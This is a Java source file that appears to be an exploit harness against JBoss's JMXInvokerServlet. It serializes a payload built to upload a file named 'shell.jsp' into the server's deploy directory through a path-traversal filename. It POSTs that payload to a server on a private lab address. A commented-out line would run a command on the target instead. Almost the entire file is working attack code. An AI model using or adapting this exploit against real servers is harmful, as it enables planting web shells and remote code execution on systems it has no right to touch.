package seriFileUp.test;

import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.net.ConnectException;
import java.net.HttpURLConnection;
import java.net.URL;

public class seriTest {

	public static void main(String[] args) throws Exception {		
		//CommandTask ct = new CommandTask("notepad.exe",false);
		//byte[] payload = ct.call();
		
		byte[] webShell = new String("1234567890").getBytes();
		ShellUploadTask sut = new ShellUploadTask("../server/default/deploy/test.war/shell.jsp",webShell);
		Object payload = sut.getUpFilePayload();
		
		FileOutputStream fos = new FileOutputStream("d:\\upObject.dat");
		//JAVA对象序列化数据的前4个字节为"AC ED 00 05"
	    ObjectOutputStream os = new ObjectOutputStream(fos);
	    os.writeObject(payload);
	    os.close();
		
		try {
            //Send the payload
            URL server = new URL("http://192.168.228.129:8080/invoker/JMXInvokerServlet");
            HttpURLConnection conn = (HttpURLConnection) server.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("Accept-Encoding", "x-gzip,x-deflate,gzip,deflate");
            conn.setRequestProperty("ContentType", "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation");

            ObjectOutputStream wr = new ObjectOutputStream(conn.getOutputStream());
            wr.writeObject(payload);
            
            wr.flush();
            wr.close();

            //Get the response
            InputStream is = conn.getInputStream();
            BufferedReader rd = new BufferedReader(new InputStreamReader(is));
            String line;
            StringBuffer response = new StringBuffer();
            while ((line = rd.readLine()) != null) {
                response.append(line);
            }
            
            //
            System.out.print(response);
            
            rd.close();
            
        } catch (ConnectException cex) {
            System.out.println("\nconnection error occured...");
        } catch (IOException ex) {
            ex.printStackTrace();
        }
		
	}

}
